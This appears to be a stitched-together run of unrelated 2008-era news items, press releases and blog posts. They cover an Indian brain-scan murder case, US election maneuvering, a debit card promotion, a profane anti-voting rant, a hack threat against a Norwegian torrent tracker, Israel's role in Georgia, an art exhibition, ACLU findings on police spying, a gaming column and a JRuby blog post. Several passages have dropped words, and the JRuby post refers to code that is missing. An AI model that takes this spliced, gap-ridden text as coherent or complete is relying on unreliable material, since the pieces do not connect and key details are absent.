The resulting brain waves were then fed through a program called a “ Brain Electrical Oscillations Signature test ” , or BEOS .
This was developed by Champadi Raman Mukundan , an Indian neuroscientist .
In this particular case , Aditi Sharma voluntarily took the test ( probably thinking she would breeze through it ) .
Investigators read aloud to her a version of events that they think transpired when the murder took place , reading in the first person ( “ I bought arsenic ; ” “ I met Udit at McDonald ’s ” ) .
It is claimed that during this session , the area of the brain where memories are stored buzzed .
This has led forensic investigators to claim that Sharma has “ experiential knowledge ” of having committed the murder , rather than just having heard about it .
That immediately earned Sharma a life sentence in prison , despite her protestations that she is innocent of the charges .
I ’m sure the appeal will be interesting to listen to ( assuming she decides to appeal ) .
Law enforcement experts worldwide are split over the reliability of the technology .
Some are extremely interested and want to know more about it .
Others have dismissed the work as “ shaky at best ” .
Those who support the technology say it marks the beginning of the end for people who commit crimes and then try to lie their way out of it .
All a police officer has to do is hook the person up to an EEG and watch for the brain to light up .
Henry Greely , a bioethicist at Stanford Law School , had a warning though : “ if brain scans are widely adopted , the legal issues alone are enormous , implicating at least the First , Fourth , Fifth , Sixth , Seventh and 14th Amendments to the U.S. Constitution . ”
What do you think ?
Is this a bit too draconian and risky for your liking or a step in the right direction for upholding the law ?
India ’s use of brain scans in courts dismays critics – International Herald Tribune
Senator Roberts ( R-KS ) will not attend the Republican convention in Minnesota next month .
He is the eighth Republican member to announce they will skip the event .
First Read reports :
Sen . Pat Roberts ( KS ) is now the eighth Republican senator to announce that they will not attend the GOP Convention in St. Paul , Minn. , next month .
Roberts spokeswoman told the Topeka Capital Journal today that Roberts will be campaigning that week , finishing up his 105 county statewide tour during the convention week .
Four others who ’ve announced they wo n’t be attending are — Ted Stevens ( AK ) , Elizabeth Dole ( NC ) , Gordon Smith ( OR ) , and Susan Collins ( ME ) .
All are running for re-election and are in close races .
( Collins may have the easiest race , but she ’s never been a close ally of McCain . )
Three other GOP senators who are retiring this year have also said they ’ll skip the St. Paul festivities — Larry Craig ( ID ) , Chuck Hagel ( NE ) and Wayne Allard ( CO ) .
Republican strategist Karl Rove called Sen. Joseph I. Lieberman ( I - Conn . ) late last week and urged him to contact Sen. John McCain ( R - Ariz . ) to withdraw his name from vice presidential consideration .
Rove tried to kill Lieberman VP pick
Republican strategist Karl Rove called Sen. Joseph I. Lieberman ( I - Conn . ) late last week and urged him to contact John McCain to withdraw his name from vice presidential consideration , according to three sources familiar with the conversation .
Lieberman dismissed the request , these sources agreed .

Lieberman “ laughed at the suggestion and certainly did not call [ McCain ] on it , ” said one source familiar with the details .
“ Rove called Lieberman , ” recounted a second source .
“ Lieberman told him he would not make that call . ”
Rove did not immediately respond to a request for comment .
Rove , President Bush ’s former top campaign adviser and arguably the most prominent political operative of the past generation , has no formal role in McCain ’s campaign .
But he knows much of the Arizona senator ’s high command and has been offering informal advice , both over the phone and in his position as a Fox News analyst , since McCain wrapped up the GOP nomination .
His decision to wade into the vice presidential selection process could provide Democrats fresh ammunition to tie McCain to the polarizing Bush .
It is also chafing some Lieberman allies and others wary of the selection of former Massachusetts Gov. Mitt Romney .
“ Rove is pushing Romney so aggressively some folks are beginning to wonder what 's going on , ” grumbled one veteran Republican strategist .
From his perch on Fox , Rove has touted McCain ’s fierce primary rival as strong vice presidential material .
“ Romney is already vetted by the media , has strong executive experience both in business and in government , has an interesting story to tell with saving the U.S. Olympics , and also helps McCain deal with the economy , because he can speak to the economy with a fluency that McCain does n’t have , ” Rove said on “ Fox News Sunday ” in June .
The sources spoke about Rove ’s involvement after Robert Novak , writing his first column since being diagnosed with brain cancer , reported Wednesday that McCain and some of his close associates would like to tap Lieberman for the number two slot but that putting an abortion - rights - supporting former Democrat on the Republican ticket was likely to be unrealistic .
The column said Lieberman had made that clear to McCain personally at the behest of a “ close friend , ” but a Lieberman source called that “ totally and absolutely false . ”
Reached by phone , Novak would say only : " I do n't talk about my sources . "
The maneuvering comes just days before McCain is to publicly unveil his pick Friday at a large rally in Ohio .
A senior campaign official said Wednesday that McCain has settled on his ticket mate and that the person is to be notified Thursday .
Lieberman has his advocates , especially among those who believe McCain needs to make a transformative pick to help disassociate himself from Bush and the GOP , but most establishment Republicans believe tapping the Connecticut senator would blow up next week ’s Republican convention in St. Paul , Minn. , and create major problems for McCain and the conservative base of the party this fall .
A source close to Lieberman said : " If it 's Lieberman , none of us know about it " — meaning staff , aides and friends .
The source said Lieberman is currently on vacation on Long Island , N.Y .

The current state of the stock market is pathetic .
Yesterday Suze Orman said that its better to not put any NEW Money in the stock market , wait till the losses wash out .
So what better place to put your NEW money than a high yield Savings account !
I personally use the ING Direct Savings account and am really happy to research our Featured Lender today , Perkstreet Financial .
They have this fantastic debit card that gives upto 5 % cashback .
You heard me ..its a debit card with cashback .
Here are some details :
Every four years it ’s the same game on the American left : arguments on anti-war listservs about whether or not to vote Democrat in the upcoming election .
Every four years it seems like an awful idea no matter where you live , whether it be a “ swing state ” or not .
Every four years the usual imbeciles line up behind the Dems : from Eric Alterman to Todd Gitlin , and the majority of those congregating around fluff sites like Moveon.org .
During these periods , the movements go into shut down mode , our armed forces murder thousands of innocent civilians each month , and the most absentminded of the peace activists blabber on about the need to support the troops .
Meanwhile , times get progressively tougher for your average dissenter , already pushed to the farthest margins of American society .
A subservient culture has arisen in the Land of the Free , wherein truth telling and critical discussion are seen as signs of mental and physical weakness .
You are told to suck it up and stop complaining : just accept the hardships of life and work 60 hours a week with no health care whilst being treated disparagingly because you have a clue .
This mass media culture rewards idiots .
One thing that separates the United States from its European counterparts is the fact that the bourgeois culture in the former is n’t remotely appreciable .
It was always foul and has merely gotten worse as my wretched generation has come to the fore .
It ’s a generation of insipid frat boys : rising through the ranks of corporate America not through their cunning and intellect , but rather via their ability to manipulate the show that passes for American culture .
The louder and more demonstrative you are of your clueless - ness , the richer and more powerful you get .
Is it any wonder that we ended up with the president we have ?
Is it any wonder that our next president will probably be Barack Obama ?
For all intents and purposes , he was groomed by the morally - void University of Chicago , where he taught in the law school just prior to entering politics .
What a record the UC has !
They have already produced several members of the Bush cabal , including Paul Wolfowitz and John Ashcroft .
I need n’t go in great detail about what they teach you at the University of Chicago , as my old friend at the University of Illinois , Dr. Francis Boyle , has already done so .
Now take it from someone born and raised in Chicago .
What do Chicagoans think of the University thereof ?
For the most part , they find the campus to be an island of snobbish assholes fenced off from its surrounding ghetto .
The culture of the Hyde Park neighborhood that it occupies is typical high brow progressivism : people showing off their worldliness by living in an urban environment and studying at a world - renown campus , conveniently forgetting that it ’s world renown for spearheading the Manhattan project and introducing the underpinnings to neo-liberal economics and neo-conservative politics .
With its eerily gothic architecture and its positioning in a tragically unequal part of Chicago , the University is like hell on earth .
And its contributions to the world have gone a long way into turning the entire planet into a fiery inferno .
Their latest contribution to the world ?
Barack Obama !
There are numerous problems with this man , many of which have been rather thoroughly covered by any progressive thinking news site .
As soon as he finally secured the nomination , he went and ass kissed the totalitarian AIPAC lobby to ensure these sponsors of terror that the U.S. would remain the world ’s largest perpetrator of violence once he enters office .
Prior to that , he built his entire presidential campaign on lies .
Two fibs , in particular , helped catapult him to predominance in the primary game .
The first one is that he has won hard political battles before and will continue to in November .
This millionaire graduate of one of the world ’s premiere law programs was virtually handed his senatorial seat after the crippled Illinois Republican party had to ship Alan Keyes in from Maryland to fill the shoes left by Jack Ryan , a man whose divorce records were pried open by shifty goons from the Obama campaign aiming to find dirt .
And what they found is the kind of stuff that sinks an American politician : evidence of sexual patterns deviating from the Puritan norm whilst touring Paris with his former wife .
And prior to that Obama was a state Senator in a district where there ’s only one party : one infamously corrupt and spiteful party .
If you are the Democrat chosen to win , then you win ; the election is a moot point .
Then , there was 2000 , when Obama attempted to un-seat incumbent Congressman Bobby Rush from the right , and lost by a margin of 2 to 1 .
In other words , Obama had won jack shit prior to this presidential election .
The second errant claim made by the Obama camp is that he was against the war from the beginning .
Now can someone explain to me how an impassioned opponent of war entering the U.S. Senate could possibly vote repeatedly to fund the war he was supposedly against from the beginning ?
Where was he when the Democrats took over the Congress and the anti-war American public was waiting for a leader in Washington to take charge of getting it done ?
One would expect a supposedly progressive and popular senator to do just that .
Instead , he just went babbling on about how Iran should be wiped off the map if real evidence were found to demonstrate their intent to develop one measly nuclear warhead in a world plagued by the peril of 20,000 American nukes .
While the grassroots gave Obama and the Democrats everything they needed to run this administration and its wars out of Washington , Obama was too busy stumping for the annihilation of Hamas , voting for the appointment of Condoleeza Rice , and calling out fellow Illinois Senator Richard Durbin for making the obvious comparison of Guantanamo Bay , Abu Ghraib and a Nazi concentration camp .
All that I have learned from Obama ’s brief tenure in the Senate is that he is n’t even the more progressive of Illinois ’ two senators , and he most certainly is not a skilled leader .
During a time when a good leader would be like Dennis Kucinich in the house and demand a debate on impeachment , organize members of Congress to vote against war funding , and spearhead a movement for a cabinet level Department of Peace , Obama was out writing books in preparation for his presidential bid .
He was out praising Ronald Reagan and denouncing the ’ 68 movements for being naïve and divisive .
Ronald Reagan is his man : the architect of the Latin American holocaust of the ‘ 80 ’s , wherein the United States dropped bombs everywhere from Nicaragua to El Salvador and Grenada .
Ronald Reagan , the man who alongside his wife Nancy told Americans to stop bitching and go to work .
The man who began the reversal of the paltry social system that once existed in the United States .
Ronald Reagan : the man who made sure that my generation would be one of idiots , unable to think critically , and un-interested at being global citizens .
Meanwhile , the last major social revolution , wherein social movements throughout the world shocked the prevailing social superstructure , is derided as naïve and short - sighted .
That moment where students and workers together tore down the state apparatus in Paris , challenged the political elite of the University system in California , and were beaten down by police violence in Chicago , is seen as foolishness by this man .
The last time that society functioned in the United States , wherein people had the nerve to demand structural shifts and a bridging of great sociological cleavages , was a stupid era .
Just to clarify .
Ronald Reagan , the political architect of the destruction of the American social state and the dumbing down of society , is an admirable man .
Meanwhile , the 1968 revolution , the underpinning of the European social democratic state and of New Social Movements from Seattle to Chiapas , is naïve and stupid .
Obama is essentially the American answer to the Extreme Center .
You combine right wing economic policy with politically correct social policy , the worst of all worlds , and what you get is this horrific political tendency .
L’extrême centre was a term invented by the French to describe the movement by François Bayrou in last year ’s presidential elections .
The idea behind it is that the old left - right discourse is dated , and what is needed is a time of coming together and happy fuzziness .
It ’s the same ideology that drives the Europhiles , intent on creating a super - state despite repeated protest from the pesky people .
These high and mighty extremists do n’t care what the actual workers and toilers beneath them think , for they are backwards and have n’t progressed to the point of realizing that there are no more questions to be asked : we need to all accept neo-liberal economics and be cute and PC about it .
If you question a neo-liberal European super state or a two party plutocracy in the United States , you are derided as naïve and foolish .
Your voice does n’t count , despite the fact that you are clearly in the majority .
The European Constitution / Treaty of Lisbon has squarely lost its last three public referenda .
Meanwhile , in the United States , the vast majority of people do n’t bother ever voting , because they have nothing to do with either choice offered in any election .
It ’s only the elitist minority that has any thing to gain from the extreme center .
So we are told to unite under “ one United States of America , ” as if that will automatically make everything swell .
This is a disgusting lie , since the United States is in a state of absolute disrepair .
There is a crisis ongoing basically anywhere a crisis could possibly exist .
There is a public health crisis , as 100 million Americans are either un - or under - insured .
There is a public infrastructure crisis , as people from New Orleans up through the heartland have found themselves dangerously vulnerable to nature ’s occasional attack .
There is an education crisis , as the United States has to continuously ship its engineers , doctors and professors in from other countries in order to compete .
Meanwhile , the average American worker enters the work force $ 30 - 40,000 in debt , forced to dump a hearty chunk of their monthly income on paying off their exorbitant university fees .
Oh , and I almost forgot that there is that little problem with the Dollar .
The currency that once made the world go around has been traded in for Euros by Jay - Z , as the real bling has jumped the pond .
Who wants to hustle in a currency that ’s running on par with the Swiss Franc and Canadian Dollar !?
Meanwhile , there is an ongoing cultural crisis .
Anything resembling real cultural pursuit in the arts , literature and philosophy has been almost entirely trivialized by Hollywood .
Southern California is , for all practical purposes , the center of the Empire .
American power has always hinged on the American capacity to market its mediocre film and music industry to the world , thus re-enforcing the predominance of the English language and the strength of the imperial armies present on every continent .
Hollywood has spent a great deal of its time and energy in glorifying war and warriors , treating the thoughtful and effeminate male disparagingly , while romancing the putrid characters played by the likes of Bruce Willis and the Governator .
Furthermore , your average citizen feels only as important as his financial worth .
Any other value , be it intellectual , creative , or emotional , is of little importance in the Land of the Free , which , of course , would be a lot better known as the Land of the Cheap .
People are made to be in bargain mode , falling down the cultural slippery slope via Walmart shopping sprees and fast food dining .
On Sunday , we lost a man who had a lot of insight on the decay of American culture and its fetish with cheap commodity .
George Carlin also had advice for what to do with this election and all American elections .
In his honor , I am going to sit home on Election Day rather than face the disgusting choice between two Reaganites and a token vote on the egomaniac Ralph Nader or the inept American Green party .
If you want change you can believe in , you ’re best off convincing 10,000 of your best friends to take to the streets and fight the pigs .
It ’s only these movements , from Berkeley to Seattle to Chicago , that have ever changed the social tides .
Electing a president has given us some fair entertainment , from the tragedies of Camelot to the precious days of Monica Mania .
However , the American politician is too focused on his career to do anything of any good for the American people .
Hope is in the streets , not at the ballot box !
Norbits , the largest Norwegian BitTorrent tracker is going through some rough times .
For several days now , the site has been offline due to a DDoS attack .
The site has allegedly been hacked by a group called MORRADi , which is threatening to publish all IPs and more information on the users , unless the tracker is closed .
DDoS attacks are not an unusual event for many private BitTorrent trackers .
Although they are sometimes used as an excuse for server issues , most of the larger trackers have been subject to such attacks at least once .
Norbits is one of these trackers , a medium sized community with over 10,000 members , most of them from Norway .
Norbits has suffered downtime because of DDoS attacks before , but this time the threat may be more serious than that .
In an NFO file obtained by by IT - Avisen , a group called MORRADi takes responsibility for the attack on Norbits .
“ Once again we show our power !
Once again we show your foolishness !
This is not the first time we have done it , and it wo n’t be the last , ” they write ( translated ) .
“ Enough is enough , you are becoming a real nuisance , and you are also a bunch of idiots that try to hide , so it ’s high time we punish you !
P2P is not something we want , when will you understand that ?
Do we have to take it as far as publishing your user database online ? ”
The message seems to suggest that “ sceners ” are behind the hack and the attacks , since they do n’t want their releases shared on BitTorrent trackers .
IT - Avisen journalist Trond
Bie thinks this is plausible , as he told Dagbladet : “ I know that there are people on the FTP scene that do n’t like Norbits .
It ’s not improbable that such a group wanted to attack the servers .
It ’s happened before . ”
Whether the group actually has access to all the IPs , usernames and transfer logs of Norbits users remains unclear .
This would not be the first time that a private BitTorrent tracker has been hacked .
Earlier this year the IP - addresses of seedboxes and of top-users on some of the larger private trackers leaked to BitTorrent .
Nevertheless , this kind of information is useless to anti-piracy organizations , as it is impossible to verify whether it is legit or not .
NATO guarantees that an attack against one member country is an attack against all are no longer what they used to be .
Had Georgia been inside NATO , a number of European countries would no longer be willing to consider it an attack against their own soil .
For Russia , the geopolitical stars were in perfect alignment .
The United States was badly overstretched and had no plausible way to talk tough without coming across as empty rhetoric .
American resources have been drained by the Iraq and Afghan wars , and the war on terror .
As Russian Foreign Minister Sergei Lavrov put it , Washington must now choose between its “ pet project ” Georgia and a partnership with Moscow .
Georgian President Mikheil Saakashvili evidently thought the United States would come to his side militarily if Russian troops pushed him back into Georgia after ordering an attack last Aug. 8 on the breakaway province of South Ossetia .
And when his forces were mauled by Russia ’s counterattack , bitter disappointment turned to anger .
Along with Abkhazia , Georgia lost two provinces .
Georgia also had a special relationship with Israel that was mostly under the radar .
Georgian Defense Minister Davit Kezerashvili is a former Israeli who moved things along by facilitating Israeli arms sales with U.S. aid .
“ We are now in a fight against the great Russia , ” he was quoted as saying , “ and our hope is to receive assistance from the White House because Georgia cannot survive on its own . ”
The Jerusalem Post on Aug. 12 reported , “ Georgian Prime Minister Vladimir Gurgenidze made a special call to Israel Tuesday morning to receive a blessing from one of the Haredi community ’s most important rabbis and spiritual leaders , Rabbi Aaron Leib Steinman .
‘ I want him to pray for us and our state , ' ” he was quoted .
Israel began selling arms to Georgia seven years ago .
U.S. grants facilitated these purchases .
From Israel came former minister and former Tel Aviv Mayor Roni Milo , representing Elbit Systems , and his brother Shlomo , former director general of Military Industries .
Israeli UAV spy drones , made by Elbit Maarahot Systems , conducted recon flights over southern Russia , as well as into nearby Iran .
In a secret agreement between Israel and Georgia , two military airfields in southern Georgia had been earmarked for the use of Israeli fighter - bombers in the event of pre-emptive attacks against Iranian nuclear installations .
This would sharply reduce the distance Israeli fighter - bombers would have to fly to hit targets in Iran .
And to reach Georgian airstrips , the Israeli air force would fly over Turkey .
The attack ordered by Saakashvili against South Ossetia the night of Aug. 7 provided the Russians the pretext for Moscow to order Special Forces to raid these Israeli facilities where some Israeli drones were reported captured .
At a Moscow news conference , Gen. Anatoly Nogovitsyn , Russia ’s deputy chief of staff , said the extent of Israeli aid to Georgia included “ eight types of military vehicles , explosives , landmines and special explosives for clearing minefields . ”
Estimated numbers of Israeli trainers attached to the Georgian army range from 100 to 1,000 .
There were also 110 U.S. military personnel on training assignments in Georgia .
Last July 2,000 U.S. troops were flown in for “ Immediate Response 2008 , ” a joint exercise with Georgian forces .
Details of Israel ’s involvement were largely ignored by Israeli media lest they be interpreted as another blow to Israel ’s legendary military prowess , which took a bad hit in the Lebanese war against Hezbollah two years ago .
Georgia ’s top diplomat in Tel Aviv complained about Israel ’s “ lackluster ” response to his country ’s military predicament and called for “ diplomatic pressure on Moscow . ”
According to the Jerusalem Post , the Georgian was told “ the address for that type of pressure is Washington . ”
Haaretz reported Georgian Minister Temur Yakobashvili — who is Jewish , the newspaper said — told Israeli army radio that “ Israel should be proud of its military which trained Georgian soldiers ” because he explained rather implausibly , “ a small group of our soldiers were able to wipe out an entire Russian military division , thanks to Israeli training . ”
The Tel Aviv - Tbilisi military axis was agreed at the highest levels with the approval of the Bush administration .
The official liaison between the two entities was Reserve Brig .
Gen. Gal Hirsch who commanded Israeli forces on the Lebanese border in July 2006 .
He resigned from the army after the Winograd Commission flayed Israel ’s conduct of its Second Lebanon War .
Hirsch was also blamed for the seizure of two Israeli soldiers by Hezbollah .
Israeli personnel , working for “ private ” companies with close ties to the Israel Defense Forces , also trained Georgian soldiers in house - to - house fighting .
That Russia assessed these Israeli training missions as U.S. - approved is a given .
The United States was also handicapped by a shortage of spy - in - the - sky satellite capability , already overextended by the Iraq and Afghan wars .
Neither U.S. nor Georgian intelligence knew Russian forces were ready with an immediate and massive response to the Georgian attack Moscow knew was coming .
Russian double agents ostensibly working for Georgia most probably egged on the military fantasies of the impetuous Saakashvili ’s “ surprise attack ” plans .
Saakashvili was convinced that by sending 2,000 of his soldiers to serve in Iraq ( who were immediately flown home by the United States when Russia launched a massive counterattack into Georgia ) , he would be rewarded for his loyalty .
He could not believe President Bush , a personal friend , would leave him in the lurch .
Georgia , as Saakashvili saw his country ’s role , was the “ Israel of the Caucasus . ”
The Tel Aviv - Tbilisi military axis appears to have been cemented at the highest levels , according to YNet , the Israeli electronic daily .
But whether the IAF can still count on those air bases to launch bombing missions against Iran ’s nuke facilities is now in doubt .
Iran comes out ahead in the wake of the Georgian crisis .
Neither Russia nor China is willing to respond to a Western request for more and tougher sanctions against the mullahs .
Iran ’s European trading partners are also loath to squeeze Iran .
The Russian - built , 1,000 - megawatt Iranian reactor in Bushehr is scheduled to go online early next year .
A combination of Putin and oil has put Russia back on the geopolitical map of the world .
Moscow ’s oil and gas revenue this year is projected at $ 201 billion — a 13 - fold increase since Putin succeeded Boris Yeltsin eight years ago .
Not shabby for a wannabe superpower on the comeback trail .
BBC TV pundit and 2004 bronze medal winning swimmer Steve Parry is besieged by fans in Tiananmen Square who seem to think he is US swimming sensation Michael Phelps .
THINGS did not go as well as the painter Benjamin West hoped when he unveiled “ Cicero Discovering the Tomb of Archimedes ” at the Royal Academy exhibition on April 28 , 1797 .
Painted using what were said to be the long - lost methods of Renaissance masters , the work was the centerpiece of the show .
Instead of receiving accolades ,
West soon found himself mocked by critics and satirists alike .
In “ Benjamin West and the Venetian Secret , ” an exhibition opening Sept. 18 at the Yale Center for British Art in New Haven , the story of West ’s great professional embarrassment through a scandal involving fine art , ancient manuscripts , all - out fraud and a whisper of sex is illustrated with “ Cicero ” and other art and artifacts from the era .
The show could very well be titled “ Raiders of the Lost Art . ”
By 1795 the American - born West had already taken several commissions from George III and was president of the Royal Academy of Arts in London .
He was known for contemporary history paintings like “ The Death of General Wolfe ” ( 1770 ) .
But a topic that fascinated him  and several of his colleagues  was the supposed secrets used by Titian and other 16th - century Venetian masters to attain distinctive color and luminosity in their works .

So when an artist named Ann Jemima Provis and her father , Thomas Provis , approached West and told him they had found a copy of an old manuscript that explained how the Venetians achieved their distinctive style of painting , he jumped at the chance to learn more .
Eager to incorporate the methods in the manuscript into his own work , West began experimenting with them .

FOR IMMEDIATE RELEASE
CONTACT : media@aclu-md.org
BALTIMORE – The American Civil Liberties Union of Maryland today made public what it called " shocking " documents obtained through a Maryland Public Information Act ( MPIA ) lawsuit , revealing that the Maryland State Police ( MSP ) engaged in covert surveillance of local peace and anti-death penalty groups for over a year from 2005 - 2006 .
The organization expressed alarm at the incomprehensible spying revealed in 43 pages of summaries and computer logs , none of which refer to criminal or even potentially criminal acts , other than a few isolated references to plans for completely nonviolent civil disobedience .
ACLU of Maryland Executive Director Susan Goering blasted the program as " Un- American , " and said , " I fear that the documents released today , which the MSP wrongfully withheld for almost two years , may be only the tip of the proverbial iceberg . "
Goering continued : " The documents show that the MSP engaged in surveillance operations against peaceful activists similar to those abandoned in the 1970s with the end of FBI Director J. Edgar Hoover 's infamous COINTELPRO program .
The ACLU will soon file additional requests under the Maryland Public Information
Act to assess other activities and targets of the MSP's ‘ Homeland Security and Intelligence Division ' and will seek legislative reforms to ensure this kind of improper spying never happens again . "
" In our America , you should be able to attend a meeting about an issue you care about without having to worry that government spies are entering your name into a database used to track alleged terrorists and drug traffickers , " said David Rocah , Staff Attorney for the ACLU of Maryland .
" Americans have the right to peaceably assemble with others of a like mind and speak out about what they believe in .
For undercover police officers to spend hundreds of hours entering information about lawful political protest activities into a criminal database is an unconscionable waste of taxpayer dollars and does nothing to make us safer from actual terrorists or drug dealers . "
The documents obtained in the MPIA lawsuit reveal that for 14 months , MSP 's Homeland Security and Intelligence Division sent covert agents to infiltrate the Baltimore Pledge of Resistance , a peace group , the Coalition to End the Death Penalty ( CEDP ) , and the Committee to Save Vernon Evans .
The agents collectively spent at least 288 hours on their surveillance over the 14 - month period .
An agent also joined the electronic listserv of the CEDP under an alias using a spoof email address .
Agents from the Division monitored private organizing meetings , public forums and events held in several churches , as well as anti-death penalty rallies outside the state 's SuperMax facility in Baltimore and in Lawyer 's Mall in Annapolis .
Despite the fact that reports from these events consistently said that activists acted lawfully at all times , the agents continued to recommend that the spying continue .
Reports of this surveillance were sent to at least seven federal , state , and local law enforcement agencies , including the National Security Agency , Baltimore City , Baltimore County , and Anne Arundel County police departments , and the state General Services police .
Logs of the surveillance do not contain any reports of illegal activity , but rather consist entirely of reports on the groups ' and individuals ' lawful political activities .
The MSP 's Homeland Security and Intelligence Division also appears to have been working to specially track the activities of at least one individual activist , Max Obuszewski , who was entered into the " Washington / Baltimore High Intensity Drug Trafficking Area " ( HIDTA ) database .
That database , which is funded by the federal government , was intended to facilitate information sharing among federal , state , and local law enforcement agencies engaged in drug interdiction .
In December 2006 , Congress modified the federal law to allow HIDTA funds to be used to assist in terrorism investigations as well .
The entry for Mr. Obuszewski indicates that the " Primary Crime " linked to him in the database is " Terrorism - Anti Govern[ ment ] , and the " Secondary Crime " is " Terrorism – Anti-War Protestors " – which are outlandish and blatantly false accusations .
Mr. Obuszewski , a client of the ACLU and a well known peace activist from Baltimore , is a lifelong pacifist .
He engages in principled civil disobedience and strongly believes in and promotes nonviolence .
Needless to say , there is nothing at all in any of the reports that links Mr. Obuszewski to any violent crime , much less drug trafficking or terrorism .
Rather , all of his activities reported in the database concern lawful First Amendment activity , or non-violent civil disobedience , including a report about a meeting between activists and Rep.
Benjamin Cardin in 2005 in which they asked him to support a timetable for withdrawal from Iraq .
" As a long - time peace activist who is familiar with our government 's past history of surveillance of dissidents , I surmised that groups involved in First Amendment activities would be watched and infiltrated after 9/11 , " said Max Obuszewski , a client of the ACLU .
" With the growth of the surveillance state after 9/11 , it was evident that government agencies would come looking for groups and individuals engaged in peaceful protest activity and label them terrorists .
So in all honesty , I was not surprised to be informed that I was wrongfully labeled a terrorist . "
In 1976 , following revelations of the FBI 's COINTELPRO ( Counter Intelligence Program ) , the Federal Bureau agreed to limit its spying to situations in which criminal conduct was suspected .
But after 9/11 , Attorney General John Ashcroft rewrote the guidelines so that " for the purpose of detecting or preventing terrorist activities , the FBI is authorized to visit any place and attend any event that is open to the public , on the same terms and conditions as members of the public generally . "
Yet even under those draconian rules , much of the spying apparently conducted by the MSP would have been forbidden .
In addition , the Ashcroft rules cautioned that " no information obtained from such visits shall be retained unless it relates to potential criminal or terrorist activity . "
Clearly information has been retained by the MSP that does not relate to any unlawful acts .
Attorneys representing the plaintiffs in the lawsuit are Kit Pierson and Richard Rinkema from the Washington , DC office of the law firm Heller Ehrman White & McAuliffe LLP , donating their time pro bono , and ACLU of Maryland staff attorney David Rocah .

In the gaming press , everybody 's looking for new games : this week 's big hit , next quarter 's big buzzmaker , the most hyped , the most indie , the longest - awaited sequels and the most likely flops .
We 're swimming in new product .
But in the real world , many people do n't care about what 's coming out this week , or the next .
They 're fine spending their time with just one game .
In my circle of friends , there 's a guy who plays .
He 's been playing it since before Christmas , owns all the downloadable content , and uses practice mode to get himself to expert level on drums .
Another guy , who used to be in the habit of trying every new game and then selling it on half.com , has gotten stuck on .
I lent himlast month ; it 's still collecting dust under his couch .
And I know a woman who never played games until she discovered .
She 's still playing it , to the exclusion of anything else .
We all know that some gamers need more variety than others .
But what if these friends I 've mentioned - who are happily living on a one - game diet - have the right idea ?
A $ 60 game purchase can either be the best value for your entertainment dollar , or the worst .
On the one hand , we have games that are disposable entertainment - an experience that can be consumed in 8 - 10 hours and set aside .
While bonus achievements or a token multiplayer mode might extend the short lives ofor , you 're really supposed to treat them like this week 's Hollywood blockbuster : catch it on opening night , forget about it by the next morning .
As a critic , I see plenty of these disposable games ..
In the crit biz , we call these " rentals . "
But let 's look at the other extreme , where a new game is n't like a movie , but a sport .
You can obsess overorthe same way that a golfer keeps hitting the links .
Yes , you 're shelling out for the sequels , the expansions , the online fees and other add - ons , but at heart you could play the same game and stick with it for months - all while finding new partners and competitors to challenge and fuel your rise to dominance .
Is n't that the mark of a great game ?
And what if the industry focused more on one - game players ?
Instead of jumping on the next big thing and finding out it's , or worshipping the graphics of an E3 demo only to find out you 've been drooling over , or wasting even an inch of copy on the latest movie tie - in game - what if the biggest factor in how we judge a game was its durability ?
We would also needtitles .
The next gen consoles have brought us a peculiar super - resistant strain of disposable games that sport multi-million dollar budgets , high - def animated cut - scenes , meticulously - rended environments , and at least cursory community and multiplayer support - and still , none of them is good for more than a weekend .
will be filling the resale bins while the kids at my local library are still playing checkers .
There 'll always be room for a quick new fix , but in my dream scenario , it would be faster , cheaper , and out of control - a $ 10 indie game that more than compensates the half - a - dozen people who made it , or dare I dream , more $ 20 titles like , and far fewer of the $ 60 AAA titles whose rapturous previews in the games press lead to a hangover as soon as people get their hands on it .
Meanwhile , there are signs the market already knows what it 's doing : browse the top - selling games of 2007 , and you 'll see that titles with legs , like , and bothandtop the list , while only one full - priced , high - budget quickie cracked the top 10 : , a fun game , but not one you would take to a desert island .
Personally , if I did n't write reviews every week , I know what I would play : an MMOG ( maybe - always wanted to check that out ) ; an online shooter ( after a bad day ) ; ( I 'd always secretly wanted to play expert drums , too ) ; and sure , some indie titles , just to stay hip with the kids .
I would pour more time into games that increase my skills and keep up with my need to compete .
Games that reward your commitment instead of exhausting your attention .
I 'd be like a kid learning card games for the first time , instead of a jaded adult learning another set of combo moves .
And I know what I would n't do : I would never drop $ 60 on a cinematic eight - hour experience .
I 'd rather just watch the movie .

JRuby released version 1.1.3 last month , and I missed it because these days I 'm all corporate , and I have limited access to the Internet from work , and little time to get online from home .
Speaking of which , I 'm on daddy - diaper - duty tonight , so I 'll keep this brief so as not to get interrupted ...
As Charlie Nutter posted recently , " There are a few areas that remain to be tackled ...
Refactoring the extensive logic governing how Ruby classes can extend abstract or concrete Java classes .
Kresten Krab
Thorup contributed this well over a year ago , and it 's kinda been an island unto itself .
It will take a considerable effort to rework .
" Too true , that issue has been a thorn in my virtual side for a while now .
I 've been interested in transitioning into game programming as a career move , and a lot of the libraries that I 've dabbled with use abstract classes that must be extended .
At one point , JRuby was incapable of doing that , since a Java object was actually decended from JavaProxy , not the actual Java class being extended .
Not so any more !
Tonight I pulled down trunk , and loaded up jirb .
I had also built the 3D scene graph library JMonkeyEngine , by all accounts a good one for Java .
Rumor has it that Sun's Project Wonderland will be using it instead of Java3D , and they 're dropping development on the latter for the time being .
Anywho , I was able to place the native libraries in my working directory , require the jars , and ... and just like that , I had a bunch of output from LWJGL and an empty window !
But not just any empty window ... an empty window into a virtual world , yet to be populated with 3D things , and a little message in the bottom corner telling me that I was getting about 2 K FPS and nothing to display .
Hit ESC , and the window went away and Java shut down .
Alls well that ends well .
Now , to put something into the virtual world will require more work on JRuby 's Java Integration , because SimpleGame uses a protected field called rootNode , and the JRuby subclass can't access that field yet .
But , oh , once it can , then it 's on !
Here 's how you 'd do it in Scala : Works pretty well .
My only gripe with Scala right now is the lack of Ruby - ish method aliasing alainstead ofin Java Integration land .
Scala 'sstatement does a nice job of adding those setters and getters for pure Scala objects though .
Until JRuby gets protected field access working , this bit of code does the job :
Now there 's a cool prismatic sphere in there .
The window closer button is for safety 's sake , because the default behavior of DebugGameState is to immediately exit Java , which tends to happen in the middle of the OpenGL loop and booches the VM .
StandardGame is a move away from SimpleGame into a more OO - ish paradigm , and root_node is a Ruby - ized alias to getRootNode ( ) .
But hey , at least it 's a working proof - of - concept : JRuby 's Java Integration has certainly matured , and you can do some pretty snazzy stuff with it .

I am a Unitarian .
That should be such a simple , insignificant statement of fact , nothing more than just another box on a census form to tick .
Today , however , it feels more like a war cry .
This is a difficult post for me to write because my emotions are so knotted it 's hard to make sense of what I feel .
